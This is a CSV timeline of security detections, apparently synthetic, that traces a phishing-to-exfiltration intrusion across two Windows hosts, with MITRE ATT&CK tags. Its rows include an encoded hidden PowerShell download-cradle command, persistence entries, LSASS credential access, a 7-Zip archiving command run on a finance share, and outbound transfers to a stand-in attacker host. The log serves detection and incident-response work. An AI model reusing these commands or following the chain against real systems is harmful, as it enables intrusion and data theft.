"Timestamp","Computer","Channel","EventID","Level","MitreTactics","MitreTags","RecordID","RuleTitle","Details"
"2026-03-14 04:30:05.000 -04:00","WIN-ACCT-07","Security","4624","info","","","79989","Successful Interactive Logon","LogonType: 2 ¦ TargetUserName: jdoe ¦ TargetDomainName: CORP ¦ WorkstationName: WIN-ACCT-07"
"2026-03-14 04:42:17.000 -04:00","WIN-ACCT-07","Security","4688","high","Initial Access ¦ Execution","T1566.001 ¦ T1059.001","80038","Office Application Spawned PowerShell (Possible Phishing Macro)","NewProcessName: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ ParentProcessName: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE ¦ CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA ¦ SubjectUserName: jdoe ¦ SubjectDomainName: CORP"
"2026-03-14 04:43:05.000 -04:00","WIN-ACCT-07","Microsoft-Windows-Sysmon/Operational","3","high","Command and Control","T1071.001 ¦ T1105","80114","PowerShell Network Connection to Rare External Host","Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ DestinationHostname: sync-update.example ¦ DestinationIp: 203.0.113.77 ¦ DestinationPort: 443 ¦ Protocol: tcp"
"2026-03-14 04:44:30.000 -04:00","WIN-ACCT-07","Microsoft-Windows-Sysmon/Operational","13","high","Persistence ¦ Privilege Escalation","T1547.001","80191","Autorun Registry Run Key Set to User AppData Executable","EventType: SetValue ¦ TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater ¦ Image: C:\Windows\System32\reg.exe ¦ Details: C:\Users\jdoe\AppData\Roaming\Microsoft\Windows\updater.exe"
"2026-03-14 04:45:10.000 -04:00","WIN-ACCT-07","Security","4698","high","Persistence ¦ Privilege Escalation ¦ Execution","T1053.005","80287","Scheduled Task Created Pointing at User AppData Executable","TaskName: \MicrosoftUpdaterTask ¦ SubjectUserName: jdoe ¦ Command: C:\Users\jdoe\AppData\Roaming\Microsoft\Windows\updater.exe ¦ Trigger: AtLogon"
"2026-03-14 04:48:22.000 -04:00","WIN-ACCT-07","Microsoft-Windows-Sysmon/Operational","10","crit","Credential Access","T1003.001","80311","LSASS Memory Access from Unsigned Process","SourceImage: C:\Users\jdoe\AppData\Roaming\Microsoft\Windows\updater.exe ¦ TargetImage: C:\Windows\System32\lsass.exe ¦ GrantedAccess: 0x1410 ¦ CallTrace: C:\Windows\System32\ntdll.dll+9d2e4"
"2026-03-14 04:55:03.000 -04:00","WIN-FILE-02","Security","4624","high","Lateral Movement","T1021.002","80356","Network Logon with Stolen Service Account Credentials","LogonType: 3 ¦ TargetUserName: svc-backup ¦ TargetDomainName: CORP ¦ IpAddress: 10.4.12.66 ¦ AuthenticationPackageName: NTLM"
"2026-03-14 04:56:40.000 -04:00","WIN-FILE-02","System","7045","crit","Lateral Movement ¦ Execution ¦ Persistence","T1021.002 ¦ T1543.003 ¦ T1569.002","80408","Service Installed from World-Writable Temp Path","ServiceName: WinHelpSvc ¦ ImagePath: C:\Windows\Temp\winhelpsvc.exe ¦ ServiceType: user mode service ¦ StartType: auto start ¦ Hashes: SHA256=41686f19468fec28c13d66d2dcc6b15173dd30dd45b7b488baa3119cdcdf7ec3"
"2026-03-14 05:00:00.000 -04:00","WIN-FILE-02","System","7036","info","","","80492","Service Entered Running State","ServiceName: WinDefend ¦ State: running"
"2026-03-14 05:02:15.000 -04:00","WIN-FILE-02","Security","4688","high","Collection","T1560.001","80541","Archive Utility Compressing Share Contents to Temp","NewProcessName: C:\Program Files\7-Zip\7z.exe ¦ CommandLine: 7z.exe a -p REDACTED C:\Windows\Temp\backup.7z \\WIN-FILE-02\Finance\* ¦ SubjectUserName: svc-backup ¦ SubjectDomainName: CORP"
"2026-03-14 05:08:47.000 -04:00","WIN-FILE-02","Microsoft-Windows-Sysmon/Operational","3","crit","Exfiltration","T1041","80583","Large Outbound Transfer to Rare External Host","Image: C:\Windows\System32\curl.exe ¦ DestinationIp: 203.0.113.77 ¦ DestinationHostname: sync-update.example ¦ DestinationPort: 443 ¦ Protocol: tcp"
